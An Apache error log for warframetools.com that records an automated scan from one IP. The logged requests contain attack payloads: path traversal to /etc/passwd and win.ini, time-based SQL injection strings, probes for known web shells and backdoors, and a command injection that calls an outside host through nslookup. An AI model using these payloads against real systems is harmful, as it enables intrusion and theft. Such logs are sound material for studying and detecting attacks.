[Thu Jul 08 00:23:59.966135 2021] [core:error] [pid 29427] [client 27.147.202.214:2434] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:00.020305 2021] [php7:error] [pid 29522] [client 27.147.202.214:2429] script '/var/www/html/warframetools.com/!index.php' not found or unable to stat
[Thu Jul 08 00:24:00.268698 2021] [core:error] [pid 29347] [client 27.147.202.214:2421] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Thu Jul 08 00:24:00.377987 2021] [autoindex:error] [pid 29322] [client 27.147.202.214:2815] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:00.582838 2021] [core:error] [pid 29225] [client 27.147.202.214:2427] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Thu Jul 08 00:24:00.661500 2021] [autoindex:error] [pid 29507] [client 27.147.202.214:2419] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:00.696714 2021] [autoindex:error] [pid 29322] [client 27.147.202.214:2815] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:00.699086 2021] [core:error] [pid 28787] [client 27.147.202.214:2744] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:00.934937 2021] [php7:error] [pid 29529] [client 27.147.202.214:2806] script '/usr/share/apache2/icons/3ggikwp6rvws.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:01.090745 2021] [core:error] [pid 29210] [client 27.147.202.214:2727] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:01.143315 2021] [autoindex:error] [pid 29530] [client 27.147.202.214:2816] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:01.148456 2021] [core:error] [pid 29535] [client 27.147.202.214:2819] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:01.248582 2021] [autoindex:error] [pid 29522] [client 27.147.202.214:2429] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:01.283970 2021] [core:error] [pid 29315] [client 27.147.202.214:2809] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:01.298365 2021] [autoindex:error] [pid 29322] [client 27.147.202.214:2815] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:01.313129 2021] [autoindex:error] [pid 29532] [client 27.147.202.214:2811] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://warframetools.com/
[Thu Jul 08 00:24:01.403070 2021] [core:error] [pid 29363] [client 27.147.202.214:2422] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:01.464965 2021] [core:error] [pid 29533] [client 27.147.202.214:2814] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:01.492915 2021] [core:error] [pid 29536] [client 27.147.202.214:2813] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:01.493052 2021] [core:error] [pid 29537] [client 27.147.202.214:2756] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:01.535419 2021] [autoindex:error] [pid 29534] [client 27.147.202.214:2817] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://warframetools.com/css/main.css
[Thu Jul 08 00:24:01.722463 2021] [core:error] [pid 29524] [client 27.147.202.214:2470] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Thu Jul 08 00:24:01.758292 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/Unlc8kuf') OR 243=(SELECT 243 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:01.781480 2021] [core:error] [pid 29329] [client 27.147.202.214:2413] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:01.795550 2021] [core:error] [pid 29529] [client 27.147.202.214:2806] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:02.014613 2021] [autoindex:error] [pid 29525] [client 27.147.202.214:2468] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:02.033267 2021] [core:error] [pid 29323] [client 27.147.202.214:2402] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Thu Jul 08 00:24:02.091972 2021] [core:error] [pid 29326] [client 27.147.202.214:2808] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:02.203853 2021] [authz_core:error] [pid 29369] [client 27.147.202.214:2426] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/.htaccess~
[Thu Jul 08 00:24:02.220908 2021] [core:error] [pid 29428] [client 27.147.202.214:2430] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:02.240377 2021] [core:error] [pid 29362] [client 27.147.202.214:2425] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:24:02.252198 2021] [core:error] [pid 29322] [client 27.147.202.214:2815] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:02.351158 2021] [core:error] [pid 29531] [client 27.147.202.214:2818] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:02.505212 2021] [authz_core:error] [pid 29369] [client 27.147.202.214:2426] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/.htaccess.old
[Thu Jul 08 00:24:02.561696 2021] [core:error] [pid 29543] [client 27.147.202.214:2812] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Thu Jul 08 00:24:02.803694 2021] [authz_core:error] [pid 29369] [client 27.147.202.214:2426] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/.htaccess.save
[Thu Jul 08 00:24:02.803801 2021] [core:error] [pid 29522] [client 27.147.202.214:2429] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:02.890172 2021] [core:error] [pid 29532] [client 27.147.202.214:2811] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Thu Jul 08 00:24:02.946722 2021] [core:error] [pid 29174] [client 27.147.202.214:2728] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:03.030405 2021] [php7:error] [pid 29550] [client 27.147.202.214:6366] script '/var/www/html/warframetools.com/images/_notes/kwt1kxu5di8l.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:03.068835 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index (another copy).php' not found or unable to stat
[Thu Jul 08 00:24:03.099312 2021] [core:error] [pid 29358] [client 27.147.202.214:2807] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:03.199377 2021] [core:error] [pid 29525] [client 27.147.202.214:2468] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:03.371981 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index (copy).php' not found or unable to stat
[Thu Jul 08 00:24:03.420414 2021] [core:error] [pid 29550] [client 27.147.202.214:6366] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:03.452339 2021] [core:error] [pid 29225] [client 27.147.202.214:6390] AH00126: Invalid URI in request GET /icons//../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:03.577397 2021] [core:error] [pid 29528] [client 27.147.202.214:6389] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Thu Jul 08 00:24:03.665374 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index - Copy.php' not found or unable to stat
[Thu Jul 08 00:24:03.734312 2021] [core:error] [pid 29334] [client 27.147.202.214:6379] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:03.894820 2021] [core:error] [pid 29507] [client 27.147.202.214:2419] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:03.973443 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index - Copy (2).php' not found or unable to stat
[Thu Jul 08 00:24:04.213339 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/Fe0nPFtK')) OR 78=(SELECT 78 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:04.217304 2021] [core:error] [pid 29347] [client 27.147.202.214:6365] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:04.295016 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/Copy of index.php' not found or unable to stat
[Thu Jul 08 00:24:04.609828 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/Copy of Copy of index.php' not found or unable to stat
[Thu Jul 08 00:24:04.684550 2021] [core:error] [pid 29332] [client 27.147.202.214:2431] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:04.864254 2021] [core:error] [pid 29427] [client 27.147.202.214:6441] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:04.909933 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/Copy (2) of index.php' not found or unable to stat
[Thu Jul 08 00:24:05.003619 2021] [core:error] [pid 29342] [client 27.147.202.214:2827] AH00126: Invalid URI in request GET /js/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:05.219207 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/Copy_(1)_of_index.php' not found or unable to stat
[Thu Jul 08 00:24:05.272321 2021] [core:error] [pid 29417] [client 27.147.202.214:2436] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:05.303713 2021] [core:error] [pid 29530] [client 27.147.202.214:2816] AH00126: Invalid URI in request GET /icons//../../../../../../../../boot.ini HTTP/1.1
[Thu Jul 08 00:24:05.315049 2021] [core:error] [pid 29223] [client 27.147.202.214:1543] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:05.618129 2021] [core:error] [pid 29526] [client 27.147.202.214:6371] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:05.830030 2021] [core:error] [pid 29323] [client 27.147.202.214:6622] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Thu Jul 08 00:24:05.941427 2021] [core:error] [pid 29555] [client 27.147.202.214:6358] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:06.194440 2021] [core:error] [pid 29529] [client 27.147.202.214:6402] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:06.743431 2021] [core:error] [pid 29548] [client 27.147.202.214:6784] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:06.891921 2021] [core:error] [pid 29550] [client 27.147.202.214:6795] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:07.319675 2021] [core:error] [pid 29522] [client 27.147.202.214:6747] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:07.386702 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index1.php' not found or unable to stat
[Thu Jul 08 00:24:07.652104 2021] [core:error] [pid 29549] [client 27.147.202.214:6727] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:07.950427 2021] [core:error] [pid 29558] [client 27.147.202.214:6369] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:08.115007 2021] [core:error] [pid 29225] [client 27.147.202.214:6804] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Thu Jul 08 00:24:08.219967 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index2.php' not found or unable to stat
[Thu Jul 08 00:24:08.607769 2021] [core:error] [pid 29532] [client 27.147.202.214:6750] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:09.017465 2021] [core:error] [pid 29210] [client 27.147.202.214:6749] AH00126: Invalid URI in request GET /icons//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
[Thu Jul 08 00:24:09.020492 2021] [core:error] [pid 29517] [client 27.147.202.214:6853] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:09.402506 2021] [core:error] [pid 29525] [client 27.147.202.214:6786] AH00126: Invalid URI in request GET /css/../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:09.706365 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index (3rd copy).php' not found or unable to stat
[Thu Jul 08 00:24:09.912837 2021] [core:error] [pid 29417] [client 27.147.202.214:7080] AH00126: Invalid URI in request GET /icons//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini HTTP/1.1
[Thu Jul 08 00:24:09.972462 2021] [php7:error] [pid 29192] [client 27.147.202.214:2432] script '/var/www/html/warframetools.com/WFimageboard'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:10.012134 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index (third copy).php' not found or unable to stat
[Thu Jul 08 00:24:10.847632 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index (4th copy).php' not found or unable to stat
[Thu Jul 08 00:24:10.877817 2021] [php7:error] [pid 29366] [client 27.147.202.214:9252] script '/var/www/html/warframetools.com/1'".php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:10.933180 2021] [core:error] [pid 29547] [client 27.147.202.214:6610] AH00126: Invalid URI in request GET /css/../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:11.075244 2021] [core:error] [pid 29526] [client 27.147.202.214:4327] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:11.155394 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index - Copy - Copy.php' not found or unable to stat
[Thu Jul 08 00:24:11.256249 2021] [core:error] [pid 29530] [client 27.147.202.214:7249] AH00126: Invalid URI in request GET /css/../../../web.config HTTP/1.1
[Thu Jul 08 00:24:12.211383 2021] [core:error] [pid 29555] [client 27.147.202.214:9004] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Thu Jul 08 00:24:12.340607 2021] [php7:error] [pid 29363] [client 27.147.202.214:6945] script '/var/www/html/warframetools.com/@@zJIfu.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:13.150820 2021] [core:error] [pid 29550] [client 27.147.202.214:9001] AH00126: Invalid URI in request GET /css/../../../package.json HTTP/1.1
[Thu Jul 08 00:24:13.495307 2021] [core:error] [pid 29366] [client 27.147.202.214:9252] AH00126: Invalid URI in request GET /js/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:13.803760 2021] [core:error] [pid 29548] [client 27.147.202.214:9010] AH00126: Invalid URI in request GET /js/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:14.112539 2021] [core:error] [pid 29329] [client 27.147.202.214:7038] AH00126: Invalid URI in request GET /js/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:14.879301 2021] [php7:error] [pid 29554] [client 27.147.202.214:6367] script '/var/www/html/warframetools.com/images/apc.php' not found or unable to stat
[Thu Jul 08 00:24:16.098472 2021] [core:error] [pid 29525] [client 27.147.202.214:14630] AH00126: Invalid URI in request GET /js/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:16.515942 2021] [core:error] [pid 29417] [client 27.147.202.214:11240] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:16.842429 2021] [core:error] [pid 29326] [client 27.147.202.214:14812] AH00126: Invalid URI in request GET /css/../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:17.712916 2021] [authz_core:error] [pid 29363] [client 27.147.202.214:6945] AH01630: client denied by server configuration: /var/www/html/warframetools.com/fonts/.htaccess
[Thu Jul 08 00:24:18.501379 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/phpinfo.php' not found or unable to stat
[Thu Jul 08 00:24:18.838645 2021] [core:error] [pid 29210] [client 27.147.202.214:14629] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:19.056071 2021] [php7:error] [pid 29427] [client 27.147.202.214:14733] script '/var/www/html/warframetools.com/fonts/webadmin.php' not found or unable to stat
[Thu Jul 08 00:24:19.080361 2021] [autoindex:error] [pid 29517] [client 27.147.202.214:14651] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:19.106421 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/pi.php' not found or unable to stat
[Thu Jul 08 00:24:19.118711 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/r57shell.php' not found or unable to stat
[Thu Jul 08 00:24:19.157332 2021] [core:error] [pid 29551] [client 27.147.202.214:6364] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:19.256675 2021] [autoindex:error] [pid 29545] [client 27.147.202.214:6805] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:24:19.429235 2021] [php7:error] [pid 29547] [client 27.147.202.214:14705] script '/var/www/html/warframetools.com/fonts/apc.php' not found or unable to stat
[Thu Jul 08 00:24:19.430374 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/r57.php' not found or unable to stat
[Thu Jul 08 00:24:19.748187 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/r58.php' not found or unable to stat
[Thu Jul 08 00:24:19.748403 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/php.php' not found or unable to stat
[Thu Jul 08 00:24:20.055179 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/i.php' not found or unable to stat
[Thu Jul 08 00:24:20.055625 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/c99shell.php' not found or unable to stat
[Thu Jul 08 00:24:20.089198 2021] [core:error] [pid 29526] [client 27.147.202.214:8735] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:20.109587 2021] [core:error] [pid 29223] (36)File name too long: [client 27.147.202.214:9249] AH00036: access to /icons/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af/etc/passwd failed (filesystem path '/usr/share/apache2/icons/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af')
[Thu Jul 08 00:24:20.374804 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/c99.php' not found or unable to stat
[Thu Jul 08 00:24:20.375425 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/test.php' not found or unable to stat
[Thu Jul 08 00:24:20.398996 2021] [core:error] [pid 29358] [client 27.147.202.214:8999] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:20.424347 2021] [core:error] [pid 29334] [client 27.147.202.214:6919] AH00126: Invalid URI in request GET /css/../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:20.604904 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/old_index.php' not found or unable to stat
[Thu Jul 08 00:24:20.689237 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/nstview.php' not found or unable to stat
[Thu Jul 08 00:24:20.689739 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/temp.php' not found or unable to stat
[Thu Jul 08 00:24:20.896641 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index_old.php' not found or unable to stat
[Thu Jul 08 00:24:20.988195 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/info.php' not found or unable to stat
[Thu Jul 08 00:24:20.988418 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/fonts/nst.php' not found or unable to stat
[Thu Jul 08 00:24:21.210112 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/bak_index.php' not found or unable to stat
[Thu Jul 08 00:24:21.296156 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/rst.php' not found or unable to stat
[Thu Jul 08 00:24:21.318900 2021] [core:error] [pid 29551] [client 27.147.202.214:11534] AH00126: Invalid URI in request GET /css/../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:21.523716 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index_bak.php' not found or unable to stat
[Thu Jul 08 00:24:21.597941 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/r57eng.php' not found or unable to stat
[Thu Jul 08 00:24:21.638643 2021] [core:error] [pid 29210] [client 27.147.202.214:11531] AH00126: Invalid URI in request GET /css/../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:21.826245 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/backup_index.php' not found or unable to stat
[Thu Jul 08 00:24:21.910179 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/shell.php' not found or unable to stat
[Thu Jul 08 00:24:21.957630 2021] [core:error] [pid 29362] [client 27.147.202.214:14762] AH00126: Invalid URI in request GET /css/../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:22.135407 2021] [php7:error] [pid 29534] [client 27.147.202.214:2817] script '/var/www/html/warframetools.com/index_backup.php' not found or unable to stat
[Thu Jul 08 00:24:22.223232 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/dra.php' not found or unable to stat
[Thu Jul 08 00:24:22.543414 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/r.php' not found or unable to stat
[Thu Jul 08 00:24:22.847788 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/lol.php' not found or unable to stat
[Thu Jul 08 00:24:23.168746 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/zehir.php' not found or unable to stat
[Thu Jul 08 00:24:23.482315 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:24:23.591185 2021] [core:error] [pid 29557] [client 27.147.202.214:6368] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:23.805101 2021] [php7:error] [pid 29357] [client 27.147.202.214:2415] script '/var/www/html/warframetools.com/fonts/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:24:23.900827 2021] [core:error] [pid 29531] [client 27.147.202.214:11517] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:24.121000 2021] [php7:error] [pid 29517] [client 27.147.202.214:14651] script '/var/www/html/warframetools.com/fonts/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:24:24.208381 2021] [core:error] [pid 29323] [client 27.147.202.214:11631] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:24.529014 2021] [core:error] [pid 29194] [client 27.147.202.214:8727] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:25.133564 2021] [core:error] [pid 29369] [client 27.147.202.214:2426] AH00126: Invalid URI in request GET /css/../../../../../Gemfile HTTP/1.1
[Thu Jul 08 00:24:26.043601 2021] [core:error] [pid 29527] [client 27.147.202.214:3429] AH00126: Invalid URI in request GET /css/../../../../../web.config HTTP/1.1
[Thu Jul 08 00:24:27.987285 2021] [core:error] [pid 29529] [client 27.147.202.214:13389] AH00126: Invalid URI in request GET /css/../../../../../package.json HTTP/1.1
[Thu Jul 08 00:24:28.295055 2021] [core:error] [pid 29366] [client 27.147.202.214:11519] AH00126: Invalid URI in request GET /css/../../../../../package-lock.json HTTP/1.1
[Thu Jul 08 00:24:28.723251 2021] [php7:error] [pid 29554] [client 27.147.202.214:6367] script '/var/www/html/warframetools.com/images/_notes/apc.php' not found or unable to stat
[Thu Jul 08 00:24:29.961617 2021] [php7:error] [pid 29531] [client 27.147.202.214:13475] script '/var/www/html/warframetools.com/js/extention/c2mh8rac5x7x.php' not found or unable to stat, referer: https://warframetools.com/
[Thu Jul 08 00:24:31.456596 2021] [core:error] [pid 28788] (36)File name too long: [client 27.147.202.214:6978] AH00036: access to /;(nslookup hitkhxyhjxetseea79.bxss.me||perl -e "gethostbyname('hitkhxyhjxetseea79.bxss.me')")|(nslookup hitkhxyhjxetseea79.bxss.me||perl -e "gethostbyname('hitkhxyhjxetseea79.bxss.me')")&(nslookup hitkhxyhjxetseea79.bxss.me||perl -e "gethostbyname('hitkhxyhjxetseea79.bxss.me')")/jquery.parallax.js failed (filesystem path '/var/www/html/warframetools.com/;(nslookup hitkhxyhjxetseea79.bxss.me||perl -e "gethostbyname('hitkhxyhjxetseea79.bxss.me')")|(nslookup hitkhxyhjxetseea79.bxss.me||perl -e "gethostbyname('hitkhxyhjxetseea79.bxss.me')")&(nslookup hitkhxyhjxetseea79.bxss.me||perl -e "gethostbyname('hitkhxyhjxetseea79.bxss.me')")')
[Thu Jul 08 00:24:31.901875 2021] [authz_core:error] [pid 29544] [client 27.147.202.214:6374] AH01630: client denied by server configuration: /var/www/html/warframetools.com/images/_notes/.htaccess
[Thu Jul 08 00:24:32.324603 2021] [php7:error] [pid 28787] [client 27.147.202.214:6789] script '/var/www/html/warframetools.com/images/_notes/phpinfo.php' not found or unable to stat
